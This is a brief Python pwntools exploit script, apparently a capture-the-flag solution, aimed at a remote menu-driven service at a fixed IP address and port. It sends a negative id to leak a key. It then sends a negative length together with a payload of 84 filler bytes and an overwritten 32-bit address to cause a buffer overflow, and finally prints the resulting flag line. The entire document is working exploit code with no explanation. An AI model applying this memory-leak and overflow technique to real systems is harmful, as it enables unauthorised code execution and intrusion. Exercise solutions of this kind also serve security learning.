#!/usr/bin/env 

from pwn import *

host = remote('140.113.194.66', 8787)

host.recvuntil('choice: ', drop=False)
host.sendline('1')
host.recvuntil('id: ', drop=False)
host.sendline('-1')
host.recvuntil('Age: ', drop=False)
key = host.recvline()[:-1]
print key

host.recvuntil('choice: ', drop=False)
host.sendline('2')
host.recvuntil('first: ', drop=False)
host.sendline(key)
host.recvuntil('id: ', drop=False)
host.sendline('0')
host.recvuntil('length: ', drop=False)
host.sendline('-1')
str_bo = '0' * 84
str_bo += '\xe0\x89\x04\x08'
host.sendline(str_bo)

host.recvuntil('choice: ', drop=False)
host.sendline('3')
host.recvuntil('Congrats1!', drop=False)
host.recvline()
print host.recvline()[:-1]
